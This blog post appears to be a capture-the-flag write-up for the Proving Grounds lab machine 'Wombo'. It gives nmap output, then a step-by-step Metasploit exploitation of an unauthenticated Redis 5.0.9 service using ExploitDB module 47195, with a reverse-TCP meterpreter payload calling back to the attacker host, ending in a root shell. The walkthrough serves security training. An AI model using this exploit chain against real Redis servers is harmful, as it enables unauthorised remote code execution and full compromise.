---
layout: post
title: PG | Wombo
subtitle: Wombo is full of the freshest hipster tech around.
thumbnail-img: /assets/img/OffSec.png
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 10:17 UTC
Nmap scan report for 192.168.182.69
Host is up (0.014s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
27017/tcp open   mongodb    MongoDB
| mongodb-info: 
|   MongoDB Build info
|     allocator = tcmalloc
|     ok = 1.0
|     storageEngines
|       1 = ephemeralForTest
|       2 = mmapv1
|       3 = wiredTiger
|       0 = devnull

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.71 seconds
~~~

## HTTP (TCP/80)

An Nginx web server is running on port 80

![Wombo](/assets/img/WomboPG(1).png)

I ran a gobuster sub-directory scan and nothing came back so moved onto the next port for enumeration

![Wombo](/assets/img/WomboPG(2).png)

## Redis (TCP/6379)

A Redis database runing version 5.0.9 is being hosted on port 6379, a quick vulnerability search using searchsploit revealed an Unauthenticated Code Execution ([Metasploit 47195.rb](https://www.exploit-db.com/exploits/47195)), there is also a python version of the same exploit [here](https://github.com/Ridter/redis-rce)

![Wombo](/assets/img/WomboPG(3).png)

I started by transferring the exploit from ExploitDB to my metasploit modules
~~~shell
┌──(kali㉿kali)-[~/Desktop/Wombo]
└─$ sudo cp /usr/share/exploitdb/exploits/linux/remote/47195.rb /usr/share/metasploit-framework/modules/exploits/linux/redis
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Wombo]
└─$ msfconsole -m /usr/share/metasploit-framework/modules/

msf6 > loadpath /usr/share/metasploit-framework/modules/

msf6 > reload_all
~~~
I loaded the Metasploit module for the Redis exploit

![Wombo](/assets/img/WomboPG(4).png)

Set the configuration options to match the target and our attack machine for the shell
~~~shell
msf6 exploit(linux/redis/47195) > show options

Module options (exploit/linux/redis/47195):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CUSTOM    true             yes       Whether compile payload file during exploiting
   PASSWORD  foobared         no        Redis password for authentication test
   RHOSTS    192.168.182.69   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     6379             yes       The target port (TCP)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.45.185   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addres
                                       ses.
   SRVPORT  6379             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.185   yes       The listen address (an interface may be specified)
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
~~~
Run the Exploit and we have a root shell!
~~~shell
msf6 exploit(linux/redis/47195) > run

[*] Started reverse TCP handler on 192.168.45.185:8080 
[*] 192.168.182.69:6379   - Compile redis module extension file
[+] 192.168.182.69:6379   - Payload generated successfully! 
[*] 192.168.182.69:6379   - Listening on 192.168.45.185:6379
[*] 192.168.182.69:6379   - Rogue server close...
[*] 192.168.182.69:6379   - Sending command to trigger payload.
[*] Sending stage (3045380 bytes) to 192.168.182.69
[*] Meterpreter session 2 opened (192.168.45.185:8080 -> 192.168.182.69:49978) at 2023-10-29 14:34:30 +0000
[!] 192.168.182.69:6379   - This exploit may require manual cleanup of './fhgevb.so' on the target

meterpreter > shell
Process 1250 created.
Channel 1 created.
whoami
root
~~~
